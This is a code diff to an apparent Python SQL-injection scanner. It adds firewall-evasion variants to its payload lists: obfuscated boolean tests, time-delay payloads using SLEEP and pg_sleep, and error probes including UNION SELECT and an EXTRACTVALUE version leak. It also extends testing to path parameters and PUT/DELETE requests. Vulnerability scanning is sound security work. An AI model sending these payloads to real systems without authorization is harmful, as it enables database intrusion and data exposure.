@@ -53,10 +53,18 @@ DB_ERROR_SIGS = {
 }
 
 BOOLEAN_PAIRS = [
+    # Classic
     ("' OR '1'='1", "' OR '1'='2"),
     ("' OR 1=1 --", "' OR 1=2 --"),
     ("' AND '1'='1", "' AND '1'='2"),
     ("1 OR 1=1", "1 OR 1=2"),
+    # WAF bypass variants: case variation, whitespace tricks, comments
+    ("' oR '1'='1", "' oR '1'='2"),
+    ("'/**/OR/**/'1'='1", "'/**/OR/**/'1'='2"),
+    ("' OR%091=1 --", "' OR%091=2 --"),          # tab instead of space (URL-encoded)
+    ("'%20OR%20'1'='1", "'%20OR%20'1'='2"),       # URL-encoded spaces
+    # Double-encoding
+    ("%27%20OR%20%271%27%3D%271", "%27%20OR%20%271%27%3D%272"),
 ]
 
 TIME_PAYLOADS = [
@@ -64,9 +72,20 @@ TIME_PAYLOADS = [
     ("' AND SLEEP(5) --", 5),
     ("'; WAITFOR DELAY '00:00:05' --", 5),
     ("' OR pg_sleep(5) --", 5),
+    # WAF bypass time payloads
+    ("'/**/OR/**/SLEEP(5)/**/--", 5),
+    ("';SELECT+pg_sleep(5)--", 5),
+    ("1;SELECT SLEEP(5)--", 5),
+    ("' OR 1=1 AND SLEEP(5) --", 5),
 ]
 
-ERROR_PAYLOADS = ["'", "\"", "\\", "' OR ''='", "1'1"]
+ERROR_PAYLOADS = [
+    "'", "\"", "\\", "' OR ''='", "1'1",
+    # WAF bypass error payloads
+    "';", "\\'", "''", "`;", "' --", "' #",
+    "%27", "%22", "' UNION SELECT NULL--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+]
 
 
 def _response_similarity(body_a: str, body_b: str) -> float:
@@ -104,17 +123,19 @@ class SQLiDetector(BaseDetector):
         tested = 0
         blocked = 0
 
-        # Filter endpoints with parameters
-        testable = [ep for ep in endpoints if ep.all_params and ep.method in ("GET", "POST")]
+        # Filter endpoints with parameters (query, body, or path params)
+        testable = [ep for ep in endpoints if (ep.all_params or ep.path_params) and ep.method in ("GET", "POST", "PUT", "DELETE")]
         if not testable:
             return DetectorResult(
-                test_state=TestState.NOT_APPLICABLE,
-                details="No endpoints with injectable parameters found"
+                test_state=TestState.NOT_TESTED,
+                details="No endpoints with injectable parameters found — run with --js flag for SPA crawling"
             )
 
         for ep in testable:
             tested += 1
             params = ep.all_params[:5]  # Limit params per endpoint
+            if not params and ep.path_params:
+                params = ep.path_params[:5]
             ep_signals = []
 
             # Get baseline with benign input
